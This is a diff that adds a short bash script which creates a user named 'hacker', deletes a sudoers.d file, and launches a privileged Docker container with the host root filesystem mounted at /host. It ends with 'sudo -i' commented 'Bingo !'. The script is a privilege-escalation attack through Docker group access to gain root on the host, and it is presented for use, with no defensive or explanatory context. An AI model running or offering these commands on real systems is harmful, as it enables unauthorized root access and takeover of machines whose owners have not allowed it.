@@ -1,0 +1,17 @@
+#!/bin/bash
+
+ sudo userdel hacker
+ sudo rm  /etc/sudoers.d/foo  
+ sudo useradd hacker
+ sudo passwd hacker
+ su hacker
+ sudo -v
+ 
+ docker run --privileged --interactive --tty --volume /:/host bash 
+ 
+ exit
+
+ su hacker
+
+ sudo -i  # Bingo !
+ 
